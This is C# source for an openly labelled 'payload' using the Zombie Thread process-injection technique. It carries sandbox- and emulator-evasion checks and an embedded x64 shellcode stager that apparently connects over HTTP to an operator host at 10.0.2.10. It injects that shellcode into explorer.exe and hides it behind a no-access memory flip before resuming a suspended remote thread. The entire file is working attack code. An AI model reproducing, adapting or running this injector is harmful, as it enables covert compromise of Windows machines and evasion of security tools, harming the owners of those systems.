//This payload utilizes the Technique known as Zombie Thread
//@dmcxblue

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ZombieThread
{
    class Program
    {
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[888] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xeb, 0x73, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0x50, 0x00, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x2f, 0x44, 0x61, 0x4e, 0x6a, 0x00, 0xa1, 0x11, 0xfc, 0x47, 0xa6, 0xf1, 0xb4, 0xa9, 0xf8, 0xf4, 0x5a, 0x92, 0x3c, 0x8f, 0xe2, 0x40, 0xe8, 0xa6, 0x1a, 0x81, 0x4f, 0x9e, 0xc2, 0xa1, 0xbb, 0x6a, 0x92, 0xb8, 0x42, 0xef, 0x60, 0x23, 0x76, 0xc5, 0xa4, 0x37, 0x57, 0xac, 0x42, 0xf2, 0xa9, 0xf4, 0xab, 0xb0, 0x5f, 0x45, 0x67, 0x84, 0x4f, 0xc2, 0x38, 0xe2, 0x4e, 0x88, 0xae, 0x23, 0x16, 0x9e, 0x64, 0x6b, 0xdf, 0x70, 0x6b, 0x0d, 0x59, 0x1a, 0x6d, 0x8a, 0xc1, 0xad, 0x2f, 0x7c, 0xa3, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x34, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x38, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x29, 0x0d, 0x0a, 0x00, 0x51, 0x7b, 0x5e, 0x42, 0xbf, 0x13, 0x03, 0x49, 0x82, 0x05, 0xab, 0x31, 0x7a, 0x57, 0xee, 0x42, 0xe1, 0x6d, 0xdb, 0xee, 0x1c, 0xbd, 0xfa, 0x41, 0xba, 0x37, 0x96, 0x17, 0xd8, 0x14, 0x1c, 0x76, 0xda, 0x23, 0x64, 0x1b, 0x43, 0xc2, 0x43, 0x05, 0xf3, 0xa1, 0x7b, 0x36, 0x0b, 0x05, 0x48, 0x37, 0x96, 0xa5, 0x94, 0x7e, 0x74, 0xb3, 0xde, 0x17, 0x37, 0x15, 0x1b, 0x0d, 0xc6, 0xeb, 0x08, 0x0b, 0x41, 0x7e, 0x70, 0x52, 0x5a, 0x04, 0x8b, 0x85, 0x45, 0xf3, 0x94, 0xf2, 0x9d, 0x86, 0xde, 0x46, 0x1a, 0x9b, 0xc3, 0x8b, 0x8d, 0x98, 0x7a, 0x0d, 0x62, 0x7f, 0x29, 0x1c, 0xc5, 0xe8, 0xe4, 0xac, 0x85, 0x40, 0x54, 0x46, 0x47, 0x24, 0x31, 0x26, 0xb4, 0xca, 0xb4, 0x3a, 0x44, 0x7f, 0x59, 0x5d, 0x03, 0x7a, 0xbf, 0x3d, 0xf8, 0xdc, 0xd1, 0xc1, 0x3a, 0xd9, 0xe9, 0xc1, 0x67, 0x52, 0x2f, 0xcc, 0x30, 0x3b, 0x68, 0x75, 0x1e, 0x92, 0x9c, 0x76, 0x2d, 0x98, 0x97, 0x55, 0xc8, 0xb4, 0x42, 0xb2, 0xa3, 0x3d, 0x0f, 0x28, 0xb2, 0x8a, 0x1e, 0xaa, 0x8c, 0x73, 0xd7, 0xad, 0x87, 0x35, 0x6a, 0xe6, 0x84, 0x23, 0xaf, 0x58, 0x6d, 0x63, 0xa8, 0xb9, 0x6d, 0xf1, 0x1e, 0x4c, 0xa5, 0xb6, 0xdd, 0x63, 0x73, 0xb9, 0x10, 0x67, 0x68, 0x88, 0xc6, 0xda, 0xfd, 0x66, 0xd2, 0x00, 0x0d, 0xd1, 0x6f, 0x9c, 0xe8, 0xf8, 0xcd, 0xc3, 0x06, 0xe4, 0x03, 0x0a, 0x32, 0x53, 0xa4, 0x43, 0x5d, 0x19, 0xc2, 0xa5, 0xcc, 0x05, 0x16, 0xd6, 0x8e, 0xfa, 0xfa, 0x00, 0x2a, 0xd6, 0x05, 0x50, 0x3a, 0x29, 0xb9, 0x16, 0x48, 0x72, 0x21, 0x87, 0x1b, 0xe0, 0x4f, 0xba, 0x23, 0x72, 0x3f, 0xaa, 0x90, 0xe9, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x31, 0x30, 0x2e, 0x30, 0x2e, 0x32, 0x2e, 0x31, 0x30, 0x00, 0x02, 0x23, 0xfc, 0x94 };


            IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;

            int pid = Process.GetProcessesByName("explorer")[0].Id;

            hProcess = OpenProcess(0x001F0FFF, false, pid);

            addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            VirtualProtectEx(hProcess, addr, (UIntPtr)buf.Length, 0x01, out uint lpflOldProtect);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);

            System.Threading.Thread.Sleep(20000);

            VirtualProtectEx(hProcess, addr, (UIntPtr)buf.Length, 0x40, out lpflOldProtect);

            ResumeThread(hThread);

        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
    }
}
